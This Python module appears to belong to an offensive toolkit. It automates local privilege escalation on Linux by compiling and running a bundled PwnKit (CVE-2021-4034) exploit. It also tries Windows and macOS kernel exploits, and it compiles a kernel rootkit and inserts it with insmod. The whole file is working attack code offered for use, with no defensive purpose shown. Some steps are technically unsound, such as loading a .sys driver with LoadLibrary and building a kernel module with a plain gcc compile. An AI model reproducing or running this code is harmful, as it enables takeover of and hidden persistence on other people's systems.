# modules/kernel_hijack_ext.py

import subprocess
import os
import tempfile
import ctypes
import platform
import logging
import time

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def validate_dependency(command: str) -> bool:
    """
    Validates if a required command is available on the system.
    """
    try:
        subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        return True
    except subprocess.CalledProcessError:
        logging.error(f"Dependency check failed for: {command}")
        return False

def run_command(command: str, timeout: int, error_message: str) -> str:
    """
    Helper function to run a shell command with error handling.
    """
    try:
        result = subprocess.run(command, shell=True, timeout=timeout, capture_output=True, text=True)
        if result.returncode == 0:
            return result.stdout
        else:
            logging.error(f"{error_message}: {result.stderr}")
            return f"[!] {error_message}: {result.stderr}"
    except subprocess.TimeoutExpired:
        logging.error(f"{error_message}: Command timed out.")
        return f"[!] {error_message}: Command timed out."
    except Exception as e:
        logging.error(f"{error_message}: Unexpected error: {e}")
        return f"[!] {error_message}: Unexpected error: {e}"

def exploit_kernel_linux():
    """
    Uses a local Linux kernel exploit to gain root (e.g. CVE-2021-4034 “PwnKit”).
    """
    try:
        logging.info("Attempting Linux kernel exploit...")
        if not validate_dependency("gcc"):
            return "[!] GCC compiler not found. Install GCC to proceed."

        cwd = os.getcwd()
        poc = os.path.join(cwd, "modules", "exploit_lib", "cve_2021_4034_pwnkit.c")
        if os.path.exists(poc):
            exe = f"/tmp/pwnkit_{int(time.time())}"
            result = run_command(f"gcc -o {exe} {poc}", 30, "Failed to compile exploit")
            if "[!]" in result:
                return result

            result = run_command(f"{exe}", 30, "Failed to execute exploit")
            if "[!]" in result:
                return result

            logging.info("Linux kernel exploit executed successfully.")
            return "[*] Linux kernel exploit executed successfully."
        else:
            logging.error("Kernel exploit source file not found.")
            return "[!] Kernel exploit source file not found."
    except Exception as e:
        logging.error(f"Unexpected error: {e}")
        return f"[!] exploit_kernel_linux error: {e}"

def exploit_kernel_windows():
    """
    Uses a Windows kernel driver exploit to escalate privileges.
    """
    try:
        logging.info("Attempting Windows kernel exploit...")
        if platform.system() != "Windows":
            return "[!] This exploit is only applicable to Windows systems."

        # Example: Using a known vulnerable driver exploit
        driver_path = os.path.join(os.getcwd(), "modules", "exploit_lib", "vulnerable_driver.sys")
        if not os.path.exists(driver_path):
            logging.error("Vulnerable driver file not found.")
            return "[!] Vulnerable driver file not found."

        # Load the driver and execute the exploit
        ctypes.windll.LoadLibrary(driver_path)
        logging.info("Windows kernel exploit executed successfully.")
        return "[*] Windows kernel exploit executed successfully."
    except Exception as e:
        logging.error(f"Unexpected error: {e}")
        return f"[!] exploit_kernel_windows error: {e}"

def exploit_kernel_macos():
    """
    Uses a macOS local kernel exploit to escalate privileges.
    """
    try:
        logging.info("Attempting macOS kernel exploit...")
        if platform.system() != "Darwin":
            return "[!] This exploit is only applicable to macOS systems."

        # Example: Using a known macOS kernel exploit
        exploit_path = os.path.join(os.getcwd(), "modules", "exploit_lib", "macos_kernel_exploit")
        if not os.path.exists(exploit_path):
            logging.error("macOS kernel exploit file not found.")
            return "[!] macOS kernel exploit file not found."

        result = run_command(f"{exploit_path}", 30, "Failed to execute macOS kernel exploit")
        if "[!]" in result:
            return result

        logging.info("macOS kernel exploit executed successfully.")
        return "[*] macOS kernel exploit executed successfully."
    except Exception as e:
        logging.error(f"Unexpected error: {e}")
        return f"[!] exploit_kernel_macos error: {e}"

def install_kernel_rootkit():
    """
    Compiles and inserts `sardar_rootkit.c` from kernel_rootkit/.
    """
    try:
        logging.info("Attempting to install kernel rootkit...")
        if not validate_dependency("gcc"):
            return "[!] GCC compiler not found. Install GCC to proceed."
        if not validate_dependency("insmod"):
            return "[!] insmod command not found. Install required tools to proceed."

        rootkit_c = os.path.join(os.getcwd(), "kernel_rootkit", "sardar_rootkit.c")
        if not os.path.exists(rootkit_c):
            logging.error("Rootkit source file not found.")
            return "[!] Rootkit source file not found."

        ko = tempfile.NamedTemporaryFile(delete=False, suffix=".ko").name
        result = run_command(f"gcc -O2 -c -o {ko} {rootkit_c}", 30, "Failed to compile rootkit")
        if "[!]" in result:
            return result

        result = run_command(f"insmod {ko}", 30, "Failed to insert rootkit")
        if "[!]" in result:
            return result

        logging.info("Kernel rootkit installed successfully.")
        return "[*] Kernel rootkit installed successfully."
    except Exception as e:
        logging.error(f"Unexpected error: {e}")
        return f"[!] install_kernel_rootkit error: {e}"

def remove_kernel_rootkit():
    """
    Removes any module with “sardar” in its name.
    """
    try:
        logging.info("Attempting to remove kernel rootkit...")
        if not validate_dependency("lsmod"):
            return "[!] lsmod command not found. Install required tools to proceed."
        if not validate_dependency("rmmod"):
            return "[!] rmmod command not found. Install required tools to proceed."

        ls = run_command("lsmod", 10, "Failed to list kernel modules")
        if "[!]" in ls:
            return ls

        for line in ls.splitlines():
            if line.startswith("sardar"):
                mod = line.split()[0]
                result = run_command(f"rmmod {mod}", 10, f"Failed to remove module {mod}")
                if "[!]" in result:
                    return result

        logging.info("Kernel rootkit removed successfully.")
        return "[*] Kernel rootkit removed successfully."
    except Exception as e:
        logging.error(f"Unexpected error: {e}")
        return f"[!] remove_kernel_rootkit error: {e}"
